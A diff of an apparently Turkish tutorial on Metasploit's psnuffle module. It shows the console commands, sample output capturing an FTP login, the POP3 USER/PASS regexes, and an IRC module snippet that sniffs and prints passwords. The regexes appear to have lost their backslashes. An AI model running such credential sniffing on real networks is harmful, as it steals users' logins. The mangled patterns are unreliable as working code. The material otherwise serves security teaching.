@@ -26,8 +26,8 @@ Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzeri
 
 
 ```bash
-msf **&gt;** use auxiliary/sniffer/psnuffle
-msf auxiliary**(**psnuffle**)** **&gt;** show options
+msf **>** use auxiliary/sniffer/psnuffle
+msf auxiliary**(**psnuffle**)** **>** show options
 
 Module options:
 
@@ -40,14 +40,14 @@ Module options:
    SNAPLEN    65535            yes       The number of bytes to capture
    TIMEOUT    1                yes       The number of seconds to wait **for **new data
 
-msf auxiliary**(**psnuffle**)** **&gt;** run
+msf auxiliary**(**psnuffle**)** **>** run
 **[*********]** Auxiliary module execution completed
 **[*********]** Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
 **[*********]** Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
 **[*********]** Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
 **[*********]** Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
 **[*********]** Sniffing traffic.....
-**[*********]** Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 **&gt;&gt;** victim / pass **(**220 3Com 3CDaemon FTP Server Version 2.0**)**
+**[*********]** Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 **>>** victim / pass **(**220 3Com 3CDaemon FTP Server Version 2.0**)**
 ```
 
 
@@ -73,11 +73,11 @@ Aşağıda, POP3 modülünün Düzenli ifadeler kısmı görülmektedir. Bu düz
 
 ```bash
 self.sigs **=** **{**
-:ok **=&gt;** /^**(**+OK[^n]*******)**n/si,
-:err **=&gt;** /^**(**-ERR**[**^n]*******)**n/si,
-:user **=&gt;** /^USERs+**([**^n]+**)**n/si,
-:pass **=&gt;** /^PASSs+**([**^n]+**)**n/si,
-:quit **=&gt;** /^**(**QUITs*******[**^n]*******)**n/si **}**
+:ok **=>** /^**(**+OK[^n]*******)**n/si,
+:err **=>** /^**(**-ERR**[**^n]*******)**n/si,
+:user **=>** /^USERs+**([**^n]+**)**n/si,
+:pass **=>** /^PASSs+**([**^n]+**)**n/si,
+:quit **=>** /^**(**QUITs*******[**^n]*******)**n/si **}**
 ```
 
 
@@ -95,8 +95,8 @@ Aşağıdaki örneklerde, IRC protokolü için yazılmış bir modülde olması 
 
 ```bash
 self.sigs = {
-:user =&gt; /^(NICKs+[^n]+)/si,
-:pass =&gt; /b(IDENTIFYs+[^n]+)/si,}
+:user => /^(NICKs+[^n]+)/si,
+:pass => /b(IDENTIFYs+[^n]+)/si,}
 ```
 
 
@@ -133,12 +133,12 @@ s[:user]**=**matches #Store the name into the session hash s for later use
 when :pass # When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching
 s[:pass]**=**matches # Store the password into the session hash s as well
 **if** **(**s[:user] and s[:pass]) # When we have the name and the pass sniffed, print it
-print "-&gt; IRC login sniffed: #{s[:session]} &gt;&gt; username:#{s[:user]} password:#{s[:pass]}n"
+print "-> IRC login sniffed: #{s[:session]} >> username:#{s[:user]} password:#{s[:pass]}n"
 end
 sessions.delete**(**s[:session]**)** # Remove this session because we dont need to track it anymore
 when nil
 # No matches, don't do anything else # Just in case anything else is matching...
-sessions[s[:session]].merge!**({**k **=&gt;** matches**})** # Just add it to the session object
+sessions[s[:session]].merge!**({**k **=>** matches**})** # Just add it to the session object
 end
 ```
 
